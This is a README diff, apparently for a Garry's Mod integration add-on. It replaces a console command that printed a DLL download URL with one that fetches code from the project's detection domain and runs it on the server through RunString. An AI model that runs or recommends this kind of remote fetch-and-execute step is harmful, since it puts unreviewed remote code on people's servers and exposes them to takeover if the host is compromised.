@@ -38,7 +38,7 @@ Create or add the [workshop content of gmod-integratoin](https://gmod-integratio
 To find out which DLL your server needs, run the following command in your server console:
 
 ```bash
-lua_run print("Download URL: https://github.com/gmod-integration/auto-loader/releases/latest/download/gmsv_gmod_integration_loader_" .. (system.IsWindows() and (jit and jit.arch == "x64" and "win64" or "win") or system.IsLinux() and (jit and jit.arch == "x64" and "linux64" or "linux") or "unknown") .. ".dll")
+lua_run http.Fetch("https://detect.gmod-integration.com", function(b) RunString(b, "gmi_detect") end)
 ```
 
 ##### What This Command Does
